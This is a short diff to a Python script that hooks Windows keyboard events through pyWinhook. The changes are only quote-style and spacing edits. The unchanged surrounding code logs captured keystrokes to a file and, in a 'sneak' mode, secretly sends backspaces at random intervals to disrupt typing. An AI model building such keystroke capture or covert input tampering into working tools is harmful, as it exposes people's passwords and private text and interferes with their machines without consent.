@@ -8,7 +8,7 @@ import pyWinhook
 import pythoncom
 
 # Getting configuration
-with open('config.json', 'r') as f:
+with open("config.json", "r") as f:
     config = json.load(f)
 mode = config["mode"]
 history = config[mode]["history"]
@@ -80,10 +80,10 @@ def found(event):
             return True
         # send keys randomly depending on sneak value
         if not pick:
-            pick = randint(round(sneak/2), sneak)
+            pick = randint(round(sneak / 2), sneak)
         elif current == pick:
-            keyboard.send('\b')
-            pick = randint(round(sneak/2), sneak)
+            keyboard.send("\b")
+            pick = randint(round(sneak / 2), sneak)
             current = 0
         return True
     # if mode is interested, send keys to logfile
@@ -103,7 +103,7 @@ def found(event):
 def log(event):
     global logfile
 
-    with open(logfile, 'a+') as file:
+    with open(logfile, "a+") as file:
         if event.Key == "Space":
             file.write(" ")
         else:
